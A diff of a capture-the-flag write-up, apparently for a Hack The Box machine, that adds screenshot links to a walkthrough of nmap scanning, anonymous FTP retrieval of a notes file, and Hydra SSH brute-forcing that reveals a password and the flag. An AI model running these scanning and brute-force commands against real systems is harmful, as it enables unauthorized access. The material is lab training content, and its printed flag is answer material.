@@ -14,8 +14,12 @@ sudo nmap -sS --min-rate 5000 -p- 10.129.42.113 -oN ports.txt
 ports=$(grep '/tcp' ports.txt | cut -d'/' -f1 | tr '\n' ',' | sed 's/,$//')
 sudo nmap -sC -sV -p$ports 10.129.42.113 -oN NmapResMed.txt
 ```
+![Anonymous FTP login and directory listing](images/NmapFastScan.png)
+![Anonymous FTP login and directory listing](images/NmapDeepScan.png)
 
 The scan revealed several open services: SSH (22), DNS (53), POP3 (110/995), and two FTP servers on non-standard ports (2121 and 30021). Port 30021 immediately stood out — it was running ProFTPD and had **anonymous login enabled**, with a directory named `simon` visible in the listing.
+
+![Anonymous FTP login and directory listing](images/FtpTargetPort.png)
 
 ---
 
@@ -33,6 +37,7 @@ ftp> cd simon
 ftp> ls -la
 ftp> get mynotes.txt
 ```
+![Anonymous FTP login and directory listing](images/ftp_anonymous_login.png)
 
 ---
 
@@ -49,6 +54,7 @@ hydra -P mynotes.txt -l simon 10.129.42.113 ssh
 ```
 
 Hydra successfully identified the valid credential: `simon : 8Ns8j1b!23hs4921smHzwn`
+![Anonymous FTP login and directory listing](images/mynotes_hydra.png)
 
 ---
 
@@ -66,6 +72,7 @@ ls
 cat flag.txt
 # HTB{1qay2wsx3EDC4rfv_M3D1UM}
 ```
+![Anonymous FTP login and directory listing](images/flag.png)
 
 ---
 
